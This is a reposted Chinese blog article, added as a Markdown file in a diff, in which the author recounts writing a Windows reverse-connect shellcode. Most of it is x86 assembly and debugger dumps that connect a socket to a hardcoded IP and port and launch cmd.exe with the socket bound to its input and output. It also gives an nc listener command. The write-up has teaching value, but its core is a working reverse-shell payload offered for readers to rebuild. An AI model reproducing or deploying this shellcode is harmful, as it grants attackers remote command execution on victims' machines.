@@ -1,0 +1,194 @@
+
+# 编写反连 ShellCode 遇到的难点并解决之总结
+
+> 原文：[`www.pediy.com/kssd/pediy11/105567.html`](https://www.pediy.com/kssd/pediy11/105567.html)
+
+题目：编写反连 ShellCode 遇到的难点并解决之总结
+
+作者:仙果
+
+blog:http://hi.baidu.com/zhanglinguo11
+
+## 目录
+
+0x1 题记
+
+0x2 相关
+
+0x3 难点
+
+0x4 总结
+
+## 0x1 题记
+
+漏洞分析暂告了一个段落，转向了独立编写一个反连的 ShellCode,相关代码网络上已经很多很多，自己也参考了网络上公布的代码进行编写，此篇文章主要记录编写过程中困扰自己很多时间的相关问题，并加上自己的理解。
+
+## 0x2 相关
+
+开发系统:
+
+Windows XP SP3_cn
+
+虚拟机 Windows XP sp2_cn
+
+开发软件:
+
+vc++6.0 sp6 中文版
+
+vs2008 中文版
+
+调试软件:
+
+WinDbg
+
+## 0x3 难点
+
+由于对 `win32_socket` 编程一点也不了解，最多也就编写过扫描端口的小程序，也是照着网上的代码版拼半凑的完成，所以此次编写反连的 ShellCode 的过程完全是在对其一无所知的情况下完成的，当然完成之后对 socket 编程也还是一知半解的状态。
+
+先是在网络上搜索有关于反连 ShellCode 的相关代码，真正能搜索到的代码很少，很多相同或者类似的代码对自己没有什么用处，最后在 metasploit 的网站上下载到一套代码，其机器码可以正常执行，但源码是 asm 格式在本机上编译很多地方出错，不最多如何进行修改，其功能不符合此次编写的要求，只能手动自己编写，代码作为参考。相关代码会进行打包上传，我写的源代码就不传了，大家可以根据帖出来的代码自行编写。
+
+此前已经把本地监听端口的相关代码已经完成，故利用此前的相关代码，经过比较与监听端口相比只存在相关网络处理函数的不同，其初始化函数都是相同的。
+
+### 0x3.1
+
+在虚拟机中使用 NC 工具监听需要连接的端口，命令为 `nc.exe -l -p 4444 -vv`
+
+经过 `WSAStartup` 及 `WSASocketA(2,1,0,0,0,0)` 函数处理后，接下来需要调用 `connect` 进行相关处理。
+
+查询资料得 `connect` 执行成功,则其返回值为 0,在调试的时候返回值都是 `0xffffffff`,报错并退出，代码为：
+
+```
+LConnnect:
+    push 0xF700A8C0 ; host: 192.168.0.247 6401A8C0
+    push 0x11220002 ; port: 8721 
+    mov ecx, esp
+    push byte 0x10
+    push ecx
+    push ebx
+    call [ebp + 16]   //connect
+    test eax, eax
+    jne short LFinished
+```
+
+无法得到解答，网上也没有任何细节上的问题，还好本地有一份用 C 语言实现的代码，在 vc6 中进行反汇编调试，截取相关细节
+
+```
+85:       if(0 != connect(locals, (struct sockaddr*)&s_sin, sizeof(s_sin)))
+00401AB7   mov         esi,esp
+00401AB9   push        10h
+00401ABB   push        offset s_sin (0047cdf0)
+00401AC0   mov         eax,[locals (0047ce5c)]
+00401AC5   push        eax
+00401AC6   call        dword ptr [__imp__connect@12 (0047f374)]
+00401ACC   cmp         esi,esp
+00401ACE   call        __chkesp (00420c40)
+00401AD3   test        eax,eax
+00401AD5   je          getshell+12Bh (00401aeb)
+
+  push        offset s_sin (0047cdf0)中保存了  端口和反连 IP
+0047CDF0  02 00 22 11 C0 A8 01 03  ..".括..
+0047CDF8  00 00 00 00 00 00 00 00  ........
+  mov         eax,[locals (0047ce5c)]  保存 socket 的句柄
+```
+
+在 windbg 中进行调试发现，
+
+`push 0xF700A8C0 ; host: 192.168.0.247 6401A8C0`
+
+`push 0x11220002 ; port: 8721`
+
+`mov ecx, esp`
+
+过程是 压入反连 IP 和端口，`mov ecx,esp` 这句是把端口和 IP 赋给 `ecx`，并在下面的代码中压入堆栈，作为 `connect` 的参数。
+
+还犯了一次把 192 和 168 的位置弄反的低级错误，最终得以使 `connect` 的返回值为正确的 `0x0`。
+
+接下来是对 `CreateprocessA` 的参数进行处理，主要牵扯到两个结构&si 及&pi,不知道在汇编中如何实现这两个结构，参考代码看的不是很懂，只能拿现成的代码进行反汇编，相关代码如下：
+
+`124:      CreateProcess(NULL, "cmd.exe", NULL, NULL, 1, NULL, NULL, NULL, &si, &pi);`
+
+```
+00401CB3   mov         esi,esp
+00401CB5   push        offset pi (0047ce08)  //压入&pi
+00401CBA   push        offset si (0047ce18)  //压入&si
+00401CBF   push        0
+00401CC1   push        0
+00401CC3   push        0
+00401CC5   push        1
+00401CC7   push        0
+00401CC9   push        0
+00401CCB   push        offset string "cmd.exe" (0046f178)
+00401CD0   push        0
+00401CD2   call        dword ptr [__imp__CreateProcessA@40 (0047f200)]
+
+0047CDF8  00 00 00 00 00 00 00 00  ........  //&pi
+0047CE00  00 00 00 00 00 00 00 00  ........
+0047CE08  00 00 00 00 00 00 00 00  ........
+0047CE10  00 00 00 00 00 00 00 00  ........
+0047CE18  44 00 00 00 00 00 00 00  D.......//&si
+0047CE20  00 00 00 00 00 00 00 00  ........
+0047CE28  00 00 00 00 00 00 00 00  ........
+0047CE30  00 00 00 00 00 00 00 00  ........
+0047CE38  00 00 00 00 00 00 00 00  ........
+0047CE40  00 00 00 00 00 01 00 00  ........
+0047CE48  00 00 00 00 00 00 00 00  ........
+0047CE50  A0 07 00 00 A0 07 00 00  ........
+0047CE58  A0 07 00 00 A0 07 00 00  ........
+```
+
+观察其内存数据，`&pi` 是 4 段为 `0x0` 的数据，并且其地址都是连续的，其后跟的是`&si`
+
+`&si` 的结构比较复杂，第一项的值为 `0x44` ，第十二项为 `0x100`,最后三项为 socket 的句柄，其余项都为 0，并且其内存也都是连续的，这就比较好办些。
+
+以下是实现代码，跟参考代码有部分差别
+
+```
+  
+          xchg    ebx, eax                        ; ebx = socket 句柄
+          mov    ebx,eax                           //这段代码是无用的
+        push    646D63h                         ; "cmd"
+        lea     edx, [esp]                       //把"cmd"赋给 edx
+    
+
+        sub     esp, 54h
+        mov     edi, esp
+        //mov dword ptr[edi],0x0
+
+        push    14h
+        pop     ecx                               //14h 赋给 ecx
+        xor     eax, eax
+stack_zero:
+        mov     [edi+ecx*4], eax                //这段代码对 edi 的 ecx*4 的范围内赋值 0,即初始化 0
+        loop    stack_zero
+        
+        /*以下代码构造&pi 及 si*/
+        mov     byte ptr [edi+10h], 44h         ; si.cb = sizeof(si)
+        inc     byte ptr [edi+3Ch]              ; si.dwFlags = 0x100
+        inc     byte ptr [edi+3Dh]              ; dwFlags
+        mov     [edi+48h], ebx                  ; si.hStdInput = socket
+        mov     [edi+4Ch], ebx                  ; hStdOutput = socket
+        mov     [edi+50h], ebx                  ; hStdError = socket
+        lea     eax, dword ptr [edi+10h]
+
+        push    edi        //&pi
+        push    eax        //0x44 &si
+        push    ecx
+        push    ecx
+        push    ecx
+        push    1
+        push    ecx
+        push    ecx
+        push    edx                             ; "cmd"
+        push    ecx
+        call    dword ptr [esi+0x4]
+```
+
+到这里反连 ShellCode 就完成了
+
+## 0x4 总结
+
+由于总结对 socket 编程一知半解，所以对 ShellCode 的编写也无法做到融会贯通，对数据结构一点也没有接触，看来还需要加强在编程方面的基础
+
+以上记录对大牛来说来说就是简单的不能再简单的事情，我等小菜叶只是简单记录下共享给像我一样对编写 ShellCode 不懂的兄弟。
+
+参考代码.rar
